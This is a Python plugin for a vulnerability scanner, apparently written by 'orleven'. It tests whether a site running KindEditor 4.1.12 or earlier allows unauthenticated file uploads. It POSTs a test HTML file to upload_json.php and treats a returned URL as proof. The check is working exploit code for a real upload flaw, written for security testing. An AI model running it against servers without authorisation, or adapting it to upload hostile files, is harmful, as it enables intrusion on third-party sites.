#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import json
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'kindeditor upload json'
        self.keyword = ['web', 'kindeditor', 'upload', 'json']
        self.info = 'Kindeditor <= 4.1.12 upload'
        self.type = 'upload'
        self.level = 'medium'
        self.refer = 'https://github.com/kindsoft/kindeditor/issues/249'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, '../'),
            ]))
            for path in path_list:
                try:
                    url = path + "kindeditor/php/upload_json.php?dir=file"
                    files = {"imgFile": ('mytestforyou.html', "this is a test for you. ", "text/plain")}
                    res = json.loads(self.curl('post',url, files=files))
                    if 'url'in res.keys() and 'kindeditor' in res['url']:
                        self.flag = 1
                        self.req.append({"url": url})
                        self.res.append({"info": url, "key": url})
                except:
                    pass